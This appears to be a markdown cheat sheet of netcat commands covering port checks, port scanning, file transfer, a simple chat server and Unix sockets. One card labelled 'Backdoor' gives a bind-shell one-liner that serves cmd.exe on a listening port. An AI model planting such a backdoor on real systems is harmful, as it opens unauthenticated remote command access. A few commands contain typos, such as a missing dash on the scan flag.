**netcat** allows testing of a host's ports, similar to **ping**, but more versatile because **ping** only uses the portless ICMP protocol. 

netcat can be used as a command-line replacement for Postman.

<div class="grid cards" markdown>

-   #### Find a service running on specified port

    ---

    ```sh
    nc -v nas 80
    # nas [192.18.0.10] 80 (http) open (1)

    # Disable DNS lookup
    nc -vn 192.168.0.10 80
    ```

    1. HTML verbs and routes can be provided interactively
    ```sh
    GET /ui/sessions/signin
    ```

-   #### Scan ports

    ---

    ```sh
    # Providing multiple ports, including a range
    nc -v -w 2 z '192.168.56.1' 22-23 80 443
    ```

-   #### Transfer files

    ---

    ```sh
    # Run nc in listening mode (-l) on port 3000. The file is piped through pv to monitor progress.
    tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5

    # On the receiving client, to obtain the file:
    nc 192.168.1.4 3000 | pv | tar -zxf -
    ```

-   #### Chat server

    ---

    ```sh
    # Create chat server listening on port 5000
    nc -l -vv -p 5000

    # On the other system, launch a chat session
    nc 192.168.56.1 5000
    ```

-   #### Backdoor

    ---

    ```sh
    # (Options don't appear to be valid)
    # -d
    #   Disable reading from STDIN
    # -e
    #   Specify command tu run on target system
    nc -L -p 3001 -d -e cmd.exe
    ```

-   #### Stream socket

    ---

    ```sh
    # (Options don't appear to be valid)
    nc -lU /var/tmp/mysocket &
    ss -lpn | grep "/var/tmp/"
    ```

</div>